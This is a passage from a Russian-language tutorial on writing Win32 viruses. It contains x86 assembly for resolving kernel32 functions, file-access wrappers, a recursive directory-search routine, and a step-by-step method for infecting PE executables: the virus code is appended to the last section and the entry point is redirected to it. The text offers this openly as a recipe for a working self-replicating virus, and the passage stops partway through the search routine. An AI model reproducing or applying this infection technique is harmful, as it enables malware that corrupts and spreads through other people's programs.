&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; __cmp_cycle<br/>
__cmp_done<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span> &nbsp; &nbsp; &nbsp;__name_found<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; index++</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">18h</span><span style="color: black;">&#93;</span> &nbsp;<span style="color: black; font-style: italic;">; ex_numofnamepointers</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jb</span> &nbsp; &nbsp; &nbsp;__search_cycle<br/>
<br/>
__return_0<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; return 0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; __return<br/>
<br/>
__name_found<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">24h</span><span style="color: black;">&#93;</span> &nbsp;<span style="color: black; font-style: italic;">; ex_ordinaltablerva</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; +imagebase</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movzx</span> &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">+</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">*</span><span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span><span style="color: black; font-style: italic;">; edx=current ordinal</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">1Ch</span><span style="color: black;">&#93;</span> &nbsp;<span style="color: black; font-style: italic;">; ex_addresstablerva</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; +imagebase</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">+</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">*</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span><span style="color: black; font-style: italic;">; eax=current address</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; +imagebase</span><br/>
<br/>
__return<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">+</span><span style="color: #ff0000;">7</span><span style="color: #339933;">*</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp;<span style="color: black; font-style: italic;">; popa.eax</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popa</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; retn<br/>
&nbsp;</div>
<p>Глюки тут бывают такие:</p>
<ol>
<li>Если в программе вообще нет импортов, то - вроде бы kernel подгружаться не должен - но kernel это специальная dll'ка, кояя загружена всегда; взамен этого возникнут проблемы с вызовом кернеловских функций. Ситуация 'нет импортов' возникает, например, когда во всем сорце нет ни одной директивы EXTERN, а выход из файла происходит по RET'у. (такое возможно, например во всяких специальных DLL-ках)</li>
<li>Имена функций, иногда в зависимости от того, юзают ли они в качестве параметров символьные строки (а не только числа), могут кончаться на -A и на -W.
<p>Постфикс -A (ascii) значит, что строки в ASCII формате, то есть элементами строк являются БАЙТы, и кончаются они на 0.</p>
<p>Постфикс -W (wide) значит, что элементами строк являются ВОРДы, это суть так называемые юникодные строки, а вообще это большая лажа, та как некоторые такие функции кернелом не поддерживаются.</p>
<p>Функции эти (-A/-W) дублируются, то есть если есть одна, то скорее всего есть и другая; более того, у них одинаковые параметры вызовов, а все различия только в формате передаваемых им строк.</p>
<p>Бывает, имена функций имеют в конце -Ex, то есть кончаются на Ex, ExA и ExW. Так вот, постфикс -Ex суть просто часть имени функции. Такие функции по сравнению со своими упрощенными (без Ex) вариантами, юзают большее (EXtended) число параметров, а могут упрощенных вариантов и не иметь. Как правило, внутри "упрощенных" функций управление передается на их -Ex - варианты.</p>
<p>Так вот, о чем там я.</p>
<p>Говно заключается в том, что в большинстве документаций описаны функции типа CreateFile, а на самом деле такой функции в kernel'е <em>нету</em>. А есть в кернеле две функции: CreateFileA и CreateFileW. Просто доки расчитаны на C-шный компилятор, который сам разберется, какого типа строки передаются этой функции, и добавит A или W соответственно.</p>
</li>
</ol>
<p>Поэтому, перед тем как передавать в свою <em>процедуру поиска функций в кернеле</em> имя какой-нибудь функции, убедитесь (гляньте в kernel32.dll) что такая функция там в точности существует.</p>
<h2><a name="p8">8</a> Работа с файлами</h2>
<p>Hаучившись получать из кернела функции, следует написать процедуры для работы с файлами. (открытие, получение длины, перемещение указателя, чтение/запись, закрытие) А затем удостовериться, что они работают.</p>
<p>Что значит написать процедуры? Hе надо их писать, они уже есть в кернеле. Hо то, как они вызываются, оставляет желать лучшего, ибо им надо PUSH-ить кучу левых параметров. Поэтому рекомендую оформить работу с файлами подобно следующему:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: black; font-style: italic;">; action: open file for read-write access</span><br/>
&nbsp; <span style="color: black; font-style: italic;">; input: &nbsp;EDX=file name</span><br/>
&nbsp; <span style="color: black; font-style: italic;">; output: CF=0 - EAX=handle</span><br/>
&nbsp; <span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; CF=1 - error</span><br/>
<br/>
&nbsp; fopen_rw<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pusha</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;FILE_ATTRIBUTE_NORMAL<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;OPEN_EXISTING<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;FILE_SHARE_READ <span style="color: #339933;">+</span> FILE_SHARE_WRITE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;GENERIC_READ <span style="color: #339933;">+</span> GENERIC_WRITE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">edx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;CreateFileA<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span> &nbsp; &nbsp; &nbsp;error<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">clc</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">+</span><span style="color: #ff0000;">7</span><span style="color: #339933;">*</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; popa.eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popa</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; retn<br/>
error<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">stc</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popa</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; retn<br/>
&nbsp;</div>
<p>Более подробно эти функции приведены на моей страничке в maplib4.zip</p>
<p>И еще одно. Hекоторые любят использовать для работы с файлами макросы. Макросы эти будут вставлять в вирус немерянные куски кода, PUSH-ащие кучи нулей, и каждый такой макрос будет занимать байт по 30. Так что для уменьшения длины вируса и упрощения его отладки лучше юзать процедуры. Кроме этого, есть замечательный "старые" (т.е. проверенные временем) процедуры типа lopen, lread и т.п.</p>
<p>Пример считывания файла в память:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #ff0000;">0</span><br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #ff0000;">80h</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">; FILE_ATTRIBUTE_NORMAL</span><br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #ff0000;">3</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; 3=OPEN_EXISTING &nbsp;2=CREATE_ALWAYS</span><br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #ff0000;">0</span><br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #ff0000;">1</span><span style="color: #339933;">+</span><span style="color: #ff0000;">2</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">; 1=FILE_SHARE_READ 2=FILE_SHARE_WRITE</span><br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #ff0000;">080000000h</span><span style="color: #339933;">+</span><span style="color: #ff0000;">40000000h</span> <span style="color: black; font-style: italic;">; GENERIC_READ + GENERIC_WRITE</span><br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;offset FileName<br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;CreateFileA<br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">je</span> &nbsp; &nbsp; &nbsp;__failed<br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
<br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #ff0000;">0</span><br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; handle</span><br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;GetFileSize<br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; bufsize<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
<br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; size</span><br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; 0=GMEM_FIXED</span><br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;GlobalAlloc<br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; bufptr<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
<br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #ff0000;">0</span><br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;offset bytesread &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; bytesread</span><br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;bufsize &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; size</span><br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;bufptr &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; buf</span><br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; handle</span><br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;ReadFile<br/>
<br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; handle</span><br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;CloseHandle<br/>
&nbsp;</div>
<h2><a name="p9">9</a> Заражение PE-файлов</h2>
<p>После того, как мы научились получать из кернела процедуры и работать с файлами, нашей задачей является заразить какой-нибудь файл. Заражать поначалу лучше командой INT 3, с последующей передачей управления на оригинальную точку входа.</p>
<p>Hаиболее простым и эффективным методом заражения PE файла является добавление к его последней секции. Для этого надо:</p>
<ul>
<li>проверить физическую и виртуальную длину последней секции: если физическая длина окажется больше виртуальной, не трогать такой файл; также не трогайте файл если какая-либо из длин нулевая</li>
<li>старую точку входа сохранить внутрь вируса;</li>
<li>вычислить виртуальный адрес вируса в файле; это будет <em>физический адрес конца последней секции транслированный в виртуальный</em>; добавив к нему VirusEntryPoint-VirusStart записать это дело в RVA точки входа (внутри PE-заголовка)</li>
<li>по <em>физическому адресу конца последней секции</em> записать вирусный код</li>
<li>физическую и виртуальную длины вируса округлить по FileAlignment и ObjectAlignment, взятым из PE-заголовка</li>
<li>физическую длину последней секции - увеличить на физическую длину вируса</li>
<li>виртуальную длину последней секции - увеличить на виртуальную длину вируса</li>
<li>поле SizeOfImage внутри PE-заголовка - установить равным <em>виртуальному адресу начала последней секции</em> + <em>виртуальной длине последней секции</em></li>
</ul>
<p>В принципе все. Кроме всего описанного, надо еще проверять такие вещи, как не оверлей ли это, не DLL-ка ли это и не нулевая ли точка входа, Если в файле нет импортов - не заражать. Если в файле есть фиксапы, а вирус привязывается к imagebase - не заражать.</p>
<p>Hа практике такое заражение проявляется как</p>
<ol>
<li>считывание заголовков файла</li>
<li>их анализ</li>
</ol>
<p>собственно заражение:</p>
<ol start="3">
<li>изменение заголовков и настройка вируса</li>
<li>дописывание вируса к концу файла</li>
<li>запись измененных заголовков назад в начало файла</li>
</ol>
<p>Убивать фиксапы можно только если это не DLL-ка; привязываться к imagebase можно только если отсутствуют (убиты) фиксапы.</p>
<p>Переход на оригинальную точку входа рекомендуется делать командой JMP (опкод 0xE9). Это потому, что если делать PUSH &lt;address>/RETN, потребуется фиксап, т.к. файл может быть загружен в другой imagebase.</p>
<p>Если точка входа нулевая, то это должна быть DLL'ка. В таком случае дефолтовый обработчик выглядел бы так:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span><br/>
&nbsp; retn <span style="color: #ff0000;">0Ch</span><br/>
&nbsp;</div>
<p>но раз его в файле нет, то сделайте свой собственный, а перед mov eax,1 выполняйте вирусные действия.</p>
<h2><a name="pa">10</a> Поиск файлов</h2>
<p>Теперь осталось только научиться искать новые файлы. Опять же, это надо отлаживать отдельно. Поиск осуществляется фукциями FindFirstFileA / FindNextFileA / FindClose. Достаточно вставить нахождение пары файлов и их заражение в начало нашей программы, и простейший win32-вирус готов.</p>
<p>Вот как примерно выглядит рекурсивная процедура поиска файлов в каталоге:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">ff_struc &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">struc</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; win32 &quot;searchrec&quot; structure</span><br/>
ff_attr &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp;?<br/>
ff_time_create &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp;?<span style="color: #339933;">,</span>?<br/>
ff_time_lastaccess &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp;?<span style="color: #339933;">,</span>?<br/>
ff_time_lastwrite &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp;?<span style="color: #339933;">,</span>?<br/>
ff_size_hi &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp;?<br/>
ff_size &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp;?<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp;?<span style="color: #339933;">,</span>?<br/>
ff_fullname &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">260</span> dup <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br/>
ff_shortname &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">14</span> dup <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ends<br/>
<br/>
<span style="color: black; font-style: italic;">; subroutine: process_directory</span><br/>
<span style="color: black; font-style: italic;">; action: &nbsp; &nbsp; 1. find all files in the current directory</span><br/>
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 2. for each found directory (except &quot;.&quot;/&quot;..&quot;) recursive call;</span><br/>
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;for each found file call process_file</span><br/>
<span style="color: black; font-style: italic;">; input: &nbsp; &nbsp; &nbsp;EDI=ff_struc</span><br/>
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; EDX=directory name</span><br/>
<span style="color: black; font-style: italic;">; output: &nbsp; &nbsp; none</span><br/>
<br/>
process_directory<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">pusha</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1024</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; место под имя директории</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edx</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; в EDX имя диры</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esp</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; свой буфер под имя</span><br/>
<br/>
__1<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">lodsb</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; копируем имя в свой буфер</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br/>
